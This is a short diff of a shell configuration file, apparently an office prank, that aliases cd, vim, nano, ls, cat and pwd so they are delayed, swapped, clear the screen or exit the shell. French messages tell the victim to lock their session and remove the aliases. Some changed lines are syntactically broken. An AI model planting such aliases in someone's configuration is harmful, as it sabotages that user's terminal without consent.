@@ -1,6 +1,6 @@
-alias cd='sleep 10; cd'
-alias vim='sleep 3; nano'
-alias nano='sleep 4; vim'
-alias ls='exit'
+alias cd='echo "FERMEZ VOTRE SESSION AVANT DE PARTIR >:D";sleep 10; cd'
+alias vim='FERMEZ VOTRE SESSION AVANT DE PARTIR >:D;sleep 3; nano'
+alias nano='FERMEZ VOTRE SESSION AVANT DE PARTIR >:D;sleep 4; vim'
+alias ls='echo "SUPPRIME MES ALIAS DANS ~/.zshrc POUR REPARER TON TERMINAL";sleep 10;exit'
 alias cat='clear'
 alias pwd="echo $OLDPWD"
